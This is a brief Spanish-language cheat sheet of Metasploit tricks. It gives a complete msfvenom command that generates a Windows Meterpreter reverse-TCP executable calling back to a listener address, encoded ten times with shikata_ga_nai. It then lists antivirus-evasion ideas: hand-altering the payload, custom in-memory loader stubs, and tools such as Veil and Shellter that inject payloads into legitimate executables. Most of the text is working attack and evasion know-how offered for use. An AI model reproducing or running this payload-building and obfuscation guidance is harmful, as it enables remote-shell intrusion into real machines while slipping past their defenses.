# Metasploit tricks

## Encode payloads

#### Para listar encoders: `msfvenom -l encoders`

#### Para generar un payload encodeado
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe`

### Ofuscaciones extras (A investigar)
- Modifica manualmente el payload: Cambia pequeñas partes del código para evitar patrones detectables.
- Compila un stub personalizado: Escribe un programa en C/C++ o Python que desempaquete y ejecute el payload en memoria (técnica de staging).
- Usa herramientas externas:
- Veil Framework: Genera payloads ofuscados.
- Obfuscator.io: Ofusca binarios.
- Shellter: Inyecta payloads dinámicos en ejecutables legítimos.
